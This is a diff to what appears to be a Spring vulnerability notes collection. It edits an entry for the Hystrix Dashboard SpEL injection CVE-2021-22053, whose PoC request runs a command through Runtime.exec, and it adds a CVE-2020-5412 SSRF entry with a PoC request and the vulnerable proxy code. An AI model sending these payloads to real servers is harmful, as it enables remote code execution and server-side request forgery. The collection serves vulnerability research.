@@ -328,9 +328,9 @@ org.springframework.security.oauth2.provider.endpoin.SpelView
     }
 ```
 
-## （6）Spring Cloud Netflix Hystrix Dashboard + Spring Boot Thymeleaf
+## （6）Spring Cloud Netflix Hystrix Dashboard 
 ### CVE-2021-22053 SpEL
-Affected Version: < 2.2.9.RELEASE   
+Affected Version: < 2.2.9.RELEASE + Spring Boot Thymeleaf   
 POC: 
 ```
 GET /hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec("open -a calculator")}__::.x/
@@ -355,6 +355,33 @@ static IStandardExpression parseExpression(IExpressionContext context, String in
     String preprocessedInput = preprocess ? StandardExpressionPreprocessor.preprocess(context, input) : input;
 }
 ```
+
+### CVE-2020-5412 SSRF
+Affected Version: <  2.2.4 or 2.1.6   
+Diff: https://github.com/spring-cloud/spring-cloud-netflix/commit/624bbc8b50f7b5b6a1addc62040e4f2587f24f1b   
+POC: 
+```
+GET /proxy.stream?origin=www.baidu.com
+```
+Factor: 
+```
+org.springframework.cloud.netflix.hystrix.dashboard.HystrixDashboardConfiguration
+protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+    String origin = request.getParameter("origin");
+    StringBuilder url = new StringBuilder();
+    if (!origin.startsWith("http")) {
+        url.append("http://");
+    }
+    url.append(origin);
+    String proxyUrl = url.toString();
+    try {
+        httpget = new HttpGet(proxyUrl);
+        HttpClient client = HystrixDashboardConfiguration.ProxyStreamServlet.ProxyConnectionManager.httpClient;
+        HttpResponse httpResponse = client.execute(httpget);
+    }
+}
+```
+
 ## （7）Spring Boot Actuator Logview
 ### CVE-2021-21234 Directory Traversal 
 Affected Version: < 0.2.13  
